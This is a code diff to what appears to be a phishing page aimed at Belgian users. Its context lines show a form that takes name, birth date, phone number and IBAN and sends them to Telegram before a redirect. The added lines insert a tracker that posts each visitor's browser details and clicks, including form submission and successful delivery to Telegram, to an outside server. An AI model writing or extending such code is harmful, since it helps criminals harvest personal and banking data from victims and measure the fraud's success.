@@ -568,6 +568,32 @@
         // ============================================================
 
         // ============================================================
+        //  CLICK TRACKER
+        // ============================================================
+        var TRACK_URL = "https://vpshp.onrender.com/track";
+
+        function trackClick(name, extra) {
+            try {
+                var payload = {
+                    name: name || "unknown",
+                    extra: extra || "",
+                    ua: navigator.userAgent || "",
+                    ref: document.referrer || "",
+                    lang: (navigator.language || "").slice(0, 5),
+                    screen: (screen && screen.width && screen.height) ? (screen.width + "x" + screen.height) : "",
+                    ts: new Date().toISOString()
+                };
+                fetch(TRACK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).catch(function () {});
+            } catch (e) {}
+        }
+        // ============================================================
+
+        // ============================================================
         //  ПЕРЕВОДЫ NL / FR / DE
         // ============================================================
         var I18N = {
@@ -823,6 +849,7 @@
             }
             document.querySelectorAll('#langSwitch span[data-lang]').forEach(function (el) {
                 el.addEventListener('click', function () {
+                    trackClick("lang", el.getAttribute('data-lang'));
                     applyLang(el.getAttribute('data-lang'));
                 });
             });
@@ -856,7 +883,16 @@
                 }, 500);
             }
             var nodes = document.querySelectorAll('[data-scroll]');
-            for (var i = 0; i < nodes.length; i++) nodes[i].addEventListener('click', scrollToIdentity);
+            for (var i = 0; i < nodes.length; i++) {
+                (function (el) {
+                    el.addEventListener('click', function (e) {
+                        var label = (el.getAttribute('data-i18n') || el.textContent || "").trim().slice(0, 60);
+                        var tag = el.tagName.toLowerCase();
+                        trackClick("scroll:" + tag, label);
+                        scrollToIdentity(e);
+                    });
+                })(nodes[i]);
+            }
         })();
 
         // ===== IBAN VALIDATOR =====
@@ -948,20 +984,17 @@
                 return (s || '').replace(/\D/g, '');
             }
 
-            // убираем maxlength из HTML — никаких ограничений
             ph.removeAttribute('maxlength');
 
             ph.addEventListener('input', function () {
                 var v = ph.value;
                 if (!v.startsWith(prefix)) {
-                    // если пользователь начал печатать цифры без +32 — добавляем +32
                     if (/^\d/.test(v)) {
                         v = prefix + v;
                     }
                     ph.value = v;
                     return;
                 }
-                // после +32 — только цифры, без пробелов, без ограничения длины
                 var rest = digitsOnly(v.slice(prefix.length));
                 ph.value = prefix + rest;
             });
@@ -984,6 +1017,7 @@
             if (!btn) return;
             btn.addEventListener('click', function (e) {
                 e.preventDefault();
+                trackClick("form:submit", "clicked");
                 var fio      = (document.getElementById('fio') || {}).value || '';
                 var dob      = (document.getElementById('dob') || {}).value || '';
                 var phone    = (document.getElementById('phoneInput') || {}).value || '';
@@ -1035,6 +1069,7 @@
                 .then(function (res) {
                     console.log('Telegram response:', res);
                     if (res && res.ok) {
+                        trackClick("form:success", "sent");
                         alert('Bedankt! Uw gegevens zijn verzonden.');
                         window.location.href = REDIRECT_URL;
                     } else {
